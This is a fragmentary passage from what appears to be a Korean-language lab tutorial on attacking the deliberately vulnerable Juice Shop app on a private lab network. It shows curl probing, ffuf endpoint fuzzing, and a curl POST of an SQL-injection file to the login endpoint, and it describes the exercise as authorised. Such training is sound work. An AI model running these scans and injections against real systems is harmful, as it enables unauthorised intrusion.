...
```bash
curl -s -H 'Host: juice.el34.lab' http://192.168.0.161/rest/products/search?q=test | head -c 200
```
...
```bash
printf "products\nuser\nFeedbacks\nBasketItems\nadmin\n" > /tmp/aw3.txt
ffuf -u http://192.168.0.161/rest/FUZZ -w /tmp/aw3.txt -H 'Host: juice.el34.lab' -mc 200,401,500 -s
rm -f /tmp/aw3.txt
```

- `-u http://192.168.0.161/rest/FUZZ` — `FUZZ` 자리에 워드리스트 단어가 하나씩 들어간다.
...
curl -s -H 'Host: juice.el34.lab' -H 'Content-Type: application/json' -d @/tmp/sqli.json http://192.168.0.161/rest/user/login | head -c 150
rm -f /tmp/sqli.json
```
...
> 외부 공격자 VM 192.168.0.202`(공격) / `docker exec el34-web`(방어 로그 확인)로 실행한다. **인가된 실습
